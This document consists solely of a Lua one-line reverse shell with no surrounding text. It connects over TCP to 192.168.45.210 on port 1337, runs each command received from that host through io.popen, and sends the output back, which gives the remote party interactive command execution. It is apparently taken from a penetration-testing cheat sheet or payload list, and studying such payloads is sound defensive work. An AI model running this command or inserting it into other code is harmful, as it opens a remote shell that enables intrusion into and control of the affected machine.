lua -e "local s=require('socket');local t=assert(s.tcp());t:connect('192.168.45.210',1337);while true do local r,x=t:receive();local f=assert(io.popen(r,'r'));local b=assert(f:read('*a'));t:send(b);end;f:close();t:close();"